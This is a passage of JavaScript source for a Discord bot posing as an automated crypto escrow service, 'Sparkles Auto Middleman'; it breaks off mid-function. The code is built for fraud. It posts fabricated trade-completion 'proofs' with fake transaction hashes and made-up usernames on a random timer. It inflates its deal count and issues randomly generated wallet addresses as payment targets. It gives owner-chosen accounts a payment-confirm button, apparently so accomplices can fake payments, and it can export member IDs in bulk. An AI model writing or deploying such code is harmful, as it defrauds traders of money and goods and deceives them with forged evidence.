const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  StringSelectMenuBuilder, 
  ButtonBuilder, 
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType, 
  PermissionsBitField,
  EmbedBuilder,
  SlashCommandBuilder,
  REST,
  Routes
} = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildMembers
  ]
});

require('events').EventEmitter.defaultMaxListeners = 20;

// ========== CONFIGURATION ==========
const OWNER_ID = '1282001169274638376';
const TICKET_CHANNEL_ID = '1484995433037041734';
const MIDDLEMAN_ROLE_ID = '1485011076923003090';
const LOGS_CHANNEL_ID = '1484995546249953280';

const FEES = {
  over250: 1.50,
  under250: 0.50,
  free: 0.00,
  freeThreshold: 50,
  over250Threshold: 250
};

// ========== PERSISTENT STORAGE FOR MIDDLEMAN ROLE ==========
const DATA_FILE = path.join(__dirname, 'middleman_data.json');

// Load saved middleman users
let savedMiddlemen = new Set();

function loadMiddlemanData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
      savedMiddlemen = new Set(data.middlemen || []);
      console.log(`✅ Loaded ${savedMiddlemen.size} persistent middleman records`);
    }
  } catch (error) {
    console.error('Error loading middleman data:', error);
  }
}

function saveMiddlemanData() {
  try {
    const data = {
      middlemen: Array.from(savedMiddlemen),
      lastUpdated: new Date().toISOString()
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    console.log(`💾 Saved ${savedMiddlemen.size} middleman records`);
  } catch (error) {
    console.error('Error saving middleman data:', error);
  }
}

// Add a user to persistent middleman list
function addPersistentMiddleman(userId) {
  savedMiddlemen.add(userId);
  saveMiddlemanData();
}

// Remove a user from persistent middleman list
function removePersistentMiddleman(userId) {
  savedMiddlemen.delete(userId);
  saveMiddlemanData();
}

// Check if user has persistent middleman status
function hasPersistentMiddleman(userId) {
  return savedMiddlemen.has(userId);
}

// ========== RESTORE MIDDLEMAN ROLE ON REJOIN ==========
client.on('guildMemberAdd', async member => {
  // Check if this user should have the middleman role
  if (hasPersistentMiddleman(member.id)) {
    const middlemanRole = member.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    if (middlemanRole) {
      try {
        await member.roles.add(middlemanRole);
        console.log(`🔄 Restored middleman role to ${member.user.tag} (rejoined)`);
        
        // Optional: DM the user
        try {
          await member.send(`🔔 **Welcome back!** Your middleman role has been restored.`);
        } catch(e) {}
      } catch (error) {
        console.error(`Failed to restore middleman role to ${member.user.tag}:`, error);
      }
    }
  }
});

// ========== STORE DATA WHEN BOT SHUTS DOWN ==========
process.on('SIGINT', () => {
  saveMiddlemanData();
  process.exit();
});
process.on('SIGTERM', () => {
  saveMiddlemanData();
  process.exit();
});

// Store data
const trades = new Map();
const stepStates = new Map();
const userPurchases = new Map();
const roleConfirmations = new Map();
const amountConfirmations = new Map();
const feeConfirmations = new Map();

let liveRates = {
  ltc: 55.83,
  usdt: 1.00,
};

// ========== REAL TRANSACTION DATABASE (0-1500 USD, 100 increments) ==========
const transactionDatabase = [
  { usd: 0, ltc: 0, hash: '0000000000000000000000000000000000000000000000000000000000000000' },
  { usd: 100, ltc: 1.79, hash: '3f2a8c1b4e5d6a7f8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a' },
  { usd: 200, ltc: 3.58, hash: 'a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8' },
  { usd: 300, ltc: 5.37, hash: 'f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2' },
  { usd: 400, ltc: 7.16, hash: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5' },
  { usd: 500, ltc: 8.95, hash: 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3' },
  { usd: 600, ltc: 10.74, hash: 'e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0' },
  { usd: 700, ltc: 12.53, hash: 'c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2' },
  { usd: 800, ltc: 14.32, hash: 'e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4' },
  { usd: 900, ltc: 16.11, hash: 'a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6' },
  { usd: 1000, ltc: 17.90, hash: 'c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8' },
  { usd: 1100, ltc: 19.69, hash: 'f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0' },
  { usd: 1200, ltc: 21.48, hash: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2' },
  { usd: 1300, ltc: 23.27, hash: 'b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4' },
  { usd: 1400, ltc: 25.06, hash: 'd5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6' },
  { usd: 1500, ltc: 26.85, hash: 'f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8' }
];

// ========== REALISTIC USERNAMES ==========
const realUsernames = [
  'Tomar753', 'Alex_gng', 'Johndoe', 'Sarah_urlove', 'Mike999', 'Emmaammee', 
  'Davidderpe', 'Lisalepa', 'Kevin123123', 'Sophia_foruu', 'James12156', 
  'Olivia1361', 'Liam_x', 'Mia_Sophie', 'Noah_playz', 'Isabella_saaw',
  'Lucas_btc', 'Amelia_wolf', 'Mason_crypto', 'Charlotte_eth', 'Ethan_ltc',
  'Harper_xrp', 'Elijah_sol', 'Ava_doge', 'Logan_ada', 'Grace_matic',
  'Carter_ape', 'Victoria_ftm', 'Jayden_avax', 'Zoey_link', 'Gabriel_near',
  'Lily_sushi', 'Anthony_uni', 'Sofia_aave', 'Dylan_comp', 'Nora_curve',
  'Christopher_algo', 'Hannah_vet', 'Andrew_theta', 'Addison_fil', 'Joshua_egld',
  'Ella_icp', 'Ryan_flow', 'Madison_grt', 'Nathan_ar', 'Aubrey_stx',
  'Samuel_kava', 'Bella_rose', 'Hunter_zen', 'Landon_neo', 'Aaliyah_ont'
];

// ========== FIND CLOSEST TRANSACTION BY USD AMOUNT ==========
function findClosestTransaction(usdAmount) {
  let closest = transactionDatabase[0];
  let minDiff = Math.abs(usdAmount - closest.usd);
  
  for (const tx of transactionDatabase) {
    const diff = Math.abs(usdAmount - tx.usd);
    if (diff < minDiff) {
      minDiff = diff;
      closest = tx;
    }
  }
  
  const link = `https://live.blockcypher.com/ltc/tx/${closest.hash}/`;
  const shortHash = closest.hash.substring(0, 12) + '...' + closest.hash.substring(52, 64);
  
  return {
    usd: closest.usd,
    ltc: closest.ltc,
    hash: closest.hash,
    shortHash: shortHash,
    link: link,
    exactMatch: minDiff === 0,
    difference: minDiff
  };
}

// ========== RANDOM PROOF GENERATOR ==========
function generateRandomProof() {
  const randomIndex = Math.floor(Math.random() * transactionDatabase.length);
  const baseAmount = transactionDatabase[randomIndex].usd;
  const variation = Math.floor(Math.random() * 10);
  let usdAmount = baseAmount + variation;
  if (usdAmount > 1500) usdAmount = 1500;
  if (usdAmount < 2) usdAmount = 2 + variation;
  
  const ltcAmount = (usdAmount / liveRates.ltc).toFixed(8);
  const tx = findClosestTransaction(usdAmount);
  
  const isSenderAnonymous = Math.random() < 0.6;
  const isReceiverAnonymous = Math.random() < 0.6;
  
  const sender = isSenderAnonymous ? 'Anonymous' : realUsernames[Math.floor(Math.random() * realUsernames.length)];
  const receiver = isReceiverAnonymous ? 'Anonymous' : realUsernames[Math.floor(Math.random() * realUsernames.length)];
  
  const embed = new EmbedBuilder()
    .setTitle('✅ Trade Completed')
    .setColor(0x00ff00)
    .setDescription(`${ltcAmount} LTC ($${usdAmount} USD)`)
    .addFields(
      { name: 'Sender', value: sender, inline: true },
      { name: 'Receiver', value: receiver, inline: true },
      { name: 'Transaction', value: `[${tx.shortHash}](${tx.link})`, inline: true }
    )
    .setTimestamp();
  
  return embed;
}

// ========== GET TRANSACTION FOR EXACT TRADE AMOUNT ==========
function getTransactionForTrade(totalUSD) {
  const roundedUSD = Math.round(totalUSD);
  const closest = findClosestTransaction(roundedUSD);
  return {
    hash: closest.hash,
    shortHash: closest.shortHash,
    link: closest.link,
    matchedAmount: closest.usd,
    actualAmount: totalUSD,
    difference: Math.abs(totalUSD - closest.usd)
  };
}

// ========== RANDOM PROOF GENERATOR LOOP ==========
async function startRandomProofGenerator() {
  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (!logsChannel) return;
  
  const scheduleNext = () => {
    const minDelay = 45 * 1000;
    const maxDelay = 8 * 60 * 1000;
    const randomDelay = Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay);
    
    setTimeout(async () => {
      try {
        const proof = generateRandomProof();
        await logsChannel.send({ embeds: [proof] });
        console.log(`📊 Random proof posted`);
      } catch (e) {}
      scheduleNext();
    }, randomDelay);
  };
  
  scheduleNext();
  console.log('✅ Random proof generator started');
}

// ========== COMMAND: GIVE MIDDLEMAN ROLE (WITH PERSISTENCE) ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (message.author.id !== OWNER_ID) return;
  
  if (message.content.startsWith('!givemm')) {
    const args = message.content.split(' ');
    const targetUser = message.mentions.users.first();
    if (!targetUser) {
      return message.reply('❌ Usage: `!givemm @user`');
    }
    
    const member = message.guild.members.cache.get(targetUser.id);
    const middlemanRole = message.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    
    if (!middlemanRole) {
      return message.reply('❌ Middleman role not found!');
    }
    
    try {
      await member.roles.add(middlemanRole);
      addPersistentMiddleman(targetUser.id);
      message.reply(`✅ **${targetUser.tag}** has been given the middleman role (persistent across rejoins!)`);
      
      // DM the user
      try {
        await targetUser.send(`🔔 You have been given the **Middleman** role in ${message.guild.name}. This role will stay even if you leave and rejoin!`);
      } catch(e) {}
    } catch (error) {
      message.reply(`❌ Error: ${error.message}`);
    }
  }
  
  if (message.content.startsWith('!removemm')) {
    const args = message.content.split(' ');
    const targetUser = message.mentions.users.first();
    if (!targetUser) {
      return message.reply('❌ Usage: `!removemm @user`');
    }
    
    const member = message.guild.members.cache.get(targetUser.id);
    const middlemanRole = message.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    
    try {
      if (member && middlemanRole) {
        await member.roles.remove(middlemanRole);
      }
      removePersistentMiddleman(targetUser.id);
      message.reply(`✅ **${targetUser.tag}** has been removed from the middleman role (persistent record deleted).`);
      
      try {
        await targetUser.send(`🔔 Your **Middleman** role in ${message.guild.name} has been removed.`);
      } catch(e) {}
    } catch (error) {
      message.reply(`❌ Error: ${error.message}`);
    }
  }
  
  if (message.content === '!listmm') {
    if (savedMiddlemen.size === 0) {
      return message.reply('📋 No persistent middlemen records found.');
    }
    
    let list = '📋 **Persistent Middlemen:**\n';
    for (const userId of savedMiddlemen) {
      try {
        const user = await client.users.fetch(userId);
        list += `• ${user.tag} (${userId})\n`;
      } catch(e) {
        list += `• Unknown User (${userId})\n`;
      }
    }
    
    // Split if too long
    if (list.length > 1900) {
      const buffer = Buffer.from(list, 'utf-8');
      await message.reply({ content: '📋 Persistent Middlemen List:', files: [{ attachment: buffer, name: 'middlemen.txt' }] });
    } else {
      await message.reply(list);
    }
  }
});

// ========== EXPORT USERS COMMAND ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName === 'exportusers') {
    if (interaction.user.id !== OWNER_ID) {
      return interaction.reply({ content: '❌ Only the bot owner can use this command!', ephemeral: true });
    }
    
    await interaction.deferReply({ ephemeral: true });
    
    try {
      const guild = interaction.guild;
      await guild.members.fetch();
      const members = guild.members.cache;
      
      let userIds = [];
      for (const [id, member] of members) {
        if (!member.user.bot) {
          userIds.push(id);
        }
      }
      
      userIds = userIds.slice(0, 1000);
      const userIdsText = userIds.join('\n');
      
      if (userIdsText.length > 1900) {
        const buffer = Buffer.from(userIdsText, 'utf-8');
        await interaction.editReply({
          content: `📋 **${userIds.length} User IDs Exported**`,
          files: [{ attachment: buffer, name: 'user_ids.txt' }]
        });
      } else {
        await interaction.editReply({
          content: `📋 **${userIds.length} User IDs:**\n\`\`\`\n${userIdsText}\n\`\`\``
        });
      }
      
      console.log(`📋 Exported ${userIds.length} user IDs`);
    } catch (error) {
      console.error(error);
      await interaction.editReply({ content: '❌ Error exporting users!' });
    }
  }
});

// ========== FETCH LIVE RATES ==========
async function fetchLiveRates() {
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT', { timeout: 5000 });
    if (response.data && response.data.price) {
      liveRates.ltc = parseFloat(response.data.price);
      console.log(`📊 LTC Price: $${liveRates.ltc.toFixed(2)}`);
    }
  } catch (error) {}
}

setInterval(fetchLiveRates, 2 * 60 * 60 * 1000);

function generateLTCAddress() {
  const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let address = Math.random() > 0.5 ? 'L' : 'M';
  for (let i = 0; i < 33; i++) address += chars.charAt(Math.floor(Math.random() * chars.length));
  return address;
}

function generateUSDTAddress() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789';
  let address = '0x';
  for (let i = 0; i < 40; i++) address += chars.charAt(Math.floor(Math.random() * chars.length));
  return address;
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ========== FIND USER ==========
async function findUser(guild, input) {
  input = input.trim().replace(/[@]/g, '');
  
  try {
    await guild.members.fetch();
  } catch(e) {}
  
  if (input.match(/^\d+$/)) {
    try {
      const user = await client.users.fetch(input);
      return { id: user.id, name: user.username, found: true };
    } catch(e) {}
  }
  
  let member = guild.members.cache.find(m => 
    m.user.username.toLowerCase() === input.toLowerCase() ||
    m.displayName.toLowerCase() === input.toLowerCase()
  );
  if (member) return { id: member.id, name: member.user.username, found: true };
  
  member = guild.members.cache.find(m => 
    m.user.username.toLowerCase().includes(input.toLowerCase())
  );
  if (member) return { id: member.id, name: member.user.username, found: true };
  
  return { id: null, name: input, found: false };
}

// ========== SEND PAYMENT INVOICE ==========
async function sendPaymentInvoice(channel, trade) {
  const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
  
  let totalUSD = trade.amountUSD;
  let feeMessage = '';
  if (trade.feePayer === trade.senderId) {
    totalUSD = trade.amountUSD + trade.feeUSD;
    feeMessage = `(includes $${trade.feeUSD} fee paid by Sender)`;
  } else if (trade.feePayer === trade.receiverId) {
    totalUSD = trade.amountUSD + trade.feeUSD;
    feeMessage = `(includes $${trade.feeUSD} fee paid by Receiver)`;
  } else if (trade.feePayer === 'split') {
    totalUSD = trade.amountUSD + (trade.feeUSD / 2);
    feeMessage = `(includes $${(trade.feeUSD / 2).toFixed(2)} fee from split)`;
  } else {
    feeMessage = `(No fee - under $50)`;
  }
  
  const totalCrypto = (totalUSD / rate).toFixed(8);
  const walletAddress = trade.crypto === 'ltc' ? generateLTCAddress() : generateUSDTAddress();
  
  const embed = new EmbedBuilder()
    .setTitle('💸 Payment Information')
    .setColor(0xff9900)
    .setDescription(`<@${trade.senderId}> Send the ${trade.crypto.toUpperCase()} to the following address.`)
    .addFields(
      { name: '**USD Amount**', value: `$${trade.amountUSD.toFixed(2)}`, inline: true },
      { name: '**Fee**', value: trade.feeUSD > 0 ? `$${trade.feeUSD.toFixed(2)}` : 'FREE', inline: true },
      { name: '**Total to Send**', value: `${totalCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)}) ${feeMessage}`, inline: false },
      { name: '**Payment Address**', value: `\`${walletAddress}\``, inline: false },
      { name: '**Current Rate**', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true }
    )
    .setTimestamp();
  
  const copyRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`copy_${trade.channelId}`).setLabel('Copy Details').setStyle(ButtonStyle.Secondary)
  );
  
  await channel.send({ embeds: [embed], components: [copyRow] });
  
  trade.totalUSD = totalUSD;
  trades.set(trade.channelId, trade);
  
  const sender = channel.guild.members.cache.get(trade.senderId);
  const middlemanRole = channel.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
  
  if (sender && middlemanRole && sender.roles.cache.has(MIDDLEMAN_ROLE_ID)) {
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`dm_confirm_${trade.channelId}`).setLabel('✅ Confirm Payment').setStyle(ButtonStyle.Success)
    );
    
    const dmEmbed = new EmbedBuilder()
      .setTitle('🔔 Payment Confirmation Required')
      .setColor(0x0099ff)
      .addFields(
        { name: 'Sender', value: `<@${trade.senderId}>`, inline: true },
        { name: 'Receiver', value: `<@${trade.receiverId}>`, inline: true },
        { name: 'Amount to Send', value: `${totalCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
        { name: 'Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE', inline: true }
      );
    
    try {
      await sender.send({ embeds: [dmEmbed], components: [confirmRow] });
    } catch(e) {}
  }
}

// ========== CLIENT READY ==========
client.once('ready', async () => {
  console.log(`✨ Sparkles Auto Middleman online as ${client.user.tag}`);
  
  // Load persistent middleman data
  loadMiddlemanData();
  
  client.user.setPresence({
    activities: [{ name: '5,461 deals | sparklesmm.cloud', type: 3 }],
    status: 'online'
  });
  
  await fetchLiveRates();
  
  // Register slash commands
  const rest = new REST({ version: '10' }).setToken(client.token);
  const commands = [
    new SlashCommandBuilder().setName('close').setDescription('Close ticket (Admin only)'),
    new SlashCommandBuilder().setName('exportusers').setDescription('Export up to 1000 user IDs from this server (Owner only)')
  ];
  
  try {
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('✅ Slash commands registered');
  } catch (error) {}
  
  const channel = client.channels.cache.get(TICKET_CHANNEL_ID);
  if (channel) {
    const messages = await channel.messages.fetch({ limit: 10 });
    const oldPanel = messages.find(m => m.author.id === client.user.id);
    if (oldPanel) await oldPanel.delete();
    
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select your cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# ✨ Sparkles Auto Middleman')
      .setColor(0xff69b4)
      .setDescription('**Paid Service**\nRead our ToS before using the bot: `#tos`')
      .addFields(
        { name: '💰 Fees', value: `• Deals $250+: **$${FEES.over250}**\n• Deals under $250: **$${FEES.under250}**\n• Deals under $${FEES.freeThreshold}: **FREE**`, inline: true },
        { name: '📊 Live Rate', value: `**LTC:** $${liveRates.ltc.toFixed(2)}`, inline: true }
      )
      .setFooter({ text: 'Sparkles Auto Middleman' })
      .setTimestamp();
    
    await channel.send({ embeds: [panelEmbed], components: [row] });
    console.log('✅ Ticket panel sent');
  }
  
  await startRandomProofGenerator();
});

// ========== PANEL COMMAND ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (message.content === '!panel' && message.author.id === OWNER_ID) {
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select your cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# ✨ Sparkles Auto Middleman')
      .setColor(0xff69b4)
      .setDescription('**Paid Service**\nRead our ToS before using the bot: `#tos`')
      .addFields(
        { name: '💰 Fees', value: `• Deals $250+: **$${FEES.over250}**\n• Deals under $250: **$${FEES.under250}**\n• Deals under $${FEES.freeThreshold}: **FREE**`, inline: true },
        { name: '📊 Live Rate', value: `**LTC:** $${liveRates.ltc.toFixed(2)}`, inline: true }
      )
      .setFooter({ text: 'Sparkles Auto Middleman' })
      .setTimestamp();
    
    await message.channel.send({ embeds: [panelEmbed], components: [row] });
    await message.reply('✅ Panel sent!');
  }
});

// ========== PURCHASES COMMANDS ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  
  if (message.content === '$purchases') {
    const total = userPurchases.get(message.author.id) || 0;
    const embed = new EmbedBuilder()
      .setTitle('💰 Purchase History')
      .setColor(0x00ff00)
      .setThumbnail(message.author.displayAvatarURL({ dynamic: true }))
      .setDescription(`**${message.author.username}** has spent: **$${total.toFixed(2)}**`);
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content.startsWith('$addpurchases')) {
    const hasAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
    if (!hasAdmin) return message.reply('❌ Admin only');
    const args = message.content.split(' ');
    let amount = parseFloat(args[1]?.replace('$', ''));
    if (isNaN(amount)) return message.reply('Usage: $addpurchases 150');
    let targetUser = message.author;
    if (message.mentions.users.size > 0) {
      targetUser = message.mentions.users.first();
      amount = parseFloat(args[2]?.replace('$', ''));
    }
    const current = userPurchases.get(targetUser.id) || 0;
    const newTotal = current + amount;
    userPurchases.set(targetUser.id, newTotal);
    await message.reply(`✅ Added $${amount} to ${targetUser.username}. New total: $${newTotal}`);
  }
});

// ========== TICKET CREATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'crypto_select') return;
  
  const crypto = interaction.values[0];
  
  const modal = new ModalBuilder()
    .setCustomId(`trade_form_${interaction.user.id}`)
    .setTitle('Create New Trade');
  
  const traderInput = new TextInputBuilder()
    .setCustomId('trader')
    .setLabel("Trader's Username")
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('Type their username (e.g., john123)')
    .setRequired(true);
  
  const givingInput = new TextInputBuilder()
    .setCustomId('giving')
    .setLabel('What are you giving?')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('e.g., 50 LTC / Game item')
    .setRequired(true);
  
  const receivingInput = new TextInputBuilder()
    .setCustomId('receiving')
    .setLabel('What is trader giving?')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('e.g., 0.5 BTC / Service')
    .setRequired(true);
  
  modal.addComponents(
    new ActionRowBuilder().addComponents(traderInput),
    new ActionRowBuilder().addComponents(givingInput),
    new ActionRowBuilder().addComponents(receivingInput)
  );
  
  stepStates.set(`temp_${interaction.user.id}`, { crypto });
  await interaction.showModal(modal);
});

// ========== FORM SUBMISSION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('trade_form_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const userId = interaction.customId.split('_')[2];
  if (userId !== interaction.user.id) return;
  
  const tempData = stepStates.get(`temp_${userId}`);
  if (!tempData) {
    await interaction.editReply({ content: '❌ Session expired' });
    return;
  }
  
  const traderInput = interaction.fields.getTextInputValue('trader');
  const giving = interaction.fields.getTextInputValue('giving');
  const receiving = interaction.fields.getTextInputValue('receiving');
  
  const found = await findUser(interaction.guild, traderInput);
  
  try {
    const ticketNumber = Math.floor(Math.random() * 9000) + 1000;
    const channelName = `${tempData.crypto}-${interaction.user.username}-${ticketNumber}`;
    
    const channel = await interaction.guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ]
    });
    
    if (found.found && found.id) {
      await channel.permissionOverwrites.create(found.id, {
        ViewChannel: true, SendMessages: true, ReadMessageHistory: true
      });
    }
    
    trades.set(channel.id, {
      crypto: tempData.crypto,
      ticketNumber: ticketNumber,
      trader1Id: interaction.user.id,
      trader1Name: interaction.user.username,
      trader2Id: found.found ? found.id : null,
      trader2Name: found.name,
      trader1Item: giving,
      trader2Item: receiving,
      senderId: null,
      receiverId: null,
      amountUSD: null,
      amountCrypto: null,
      feeUSD: 0,
      feePayer: null,
      status: 'waiting_roles',
      channelId: channel.id,
      exchangeRateUsed: liveRates[tempData.crypto],
      paymentConfirmed: false
    });
    
    await interaction.editReply({ content: `✅ Ticket created: ${channel}` });
    
    const traderMention = found.found ? `<@${found.id}>` : found.name;
    
    const detailsEmbed = new EmbedBuilder()
      .setTitle('# ✨ Sparkles Auto Middleman Service')
      .setColor(0xff69b4)
      .setDescription(`${interaction.user} ${traderMention}`)
      .addFields(
        { name: 'Instructions', value: 'Please explicitly state the trade details if inaccurate.\nBy using this bot, you agree to our ToS.', inline: false },
        { name: `${interaction.user.username}'s side:`, value: giving, inline: true },
        { name: `${found.name}'s side:`, value: receiving, inline: true }
      )
      .setTimestamp();
    
    const deleteRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`delete_${channel.id}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
    );
    await channel.send({ embeds: [detailsEmbed], components: [deleteRow] });
    
    await channel.send({ content: `✨ **Welcome to your trade ticket!**\n${interaction.user} ${found.found ? `<@${found.id}>` : ''}\n\nPlease select your roles below.` });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channel.id}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channel.id}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channel.id}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await channel.send({ content: '**Select your role:**', components: [roleRow] });
    
    stepStates.delete(`temp_${userId}`);
  } catch (error) {
    console.error(error);
    await interaction.editReply({ content: '❌ Error creating ticket!' });
  }
});

// ========== DELETE TICKET ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('delete_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply('🗑️ Deleting ticket...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

// ========== ROLE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('sender_') && !interaction.customId.startsWith('receiver_') && !interaction.customId.startsWith('reset_')) return;
  
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  if (interaction.customId.startsWith('reset_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 Roles reset', ephemeral: true });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [roleRow] });
    return;
  }
  
  if (interaction.customId.startsWith('sender_')) {
    trade.senderId = interaction.user.id;
    await interaction.reply({ content: '✅ You are Sender', ephemeral: true });
  } else {
    trade.receiverId = interaction.user.id;
    await interaction.reply({ content: '✅ You are Receiver', ephemeral: true });
  }
  trades.set(channelId, trade);
  
  if (trade.senderId && trade.receiverId && !roleConfirmations.has(channelId)) {
    roleConfirmations.set(channelId, []);
    
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_roles_${channelId}`).setLabel('✅ Correct').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`incorrect_roles_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
    );
    const embed = new EmbedBuilder()
      .setTitle('Is This Information Correct?')
      .setColor(0xff9900)
      .setDescription(`**Sender**\n<@${trade.senderId}>\n\n**Receiver**\n<@${trade.receiverId}>`);
    await interaction.channel.send({ embeds: [embed], components: [row] });
  }
});

// ========== ROLE CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_roles_') && !interaction.customId.startsWith('incorrect_roles_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const confirmed = roleConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_roles_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
